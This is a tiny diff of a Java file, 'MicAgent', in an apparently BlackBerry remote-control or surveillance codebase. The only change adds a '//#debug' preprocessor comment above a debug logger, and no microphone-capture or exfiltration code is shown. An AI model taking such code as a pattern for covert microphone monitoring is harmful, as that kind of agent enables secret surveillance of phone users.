@@ -4,6 +4,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class MicAgent extends Agent {
+	//#debug
     static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);
 
     public MicAgent(boolean agentStatus) {
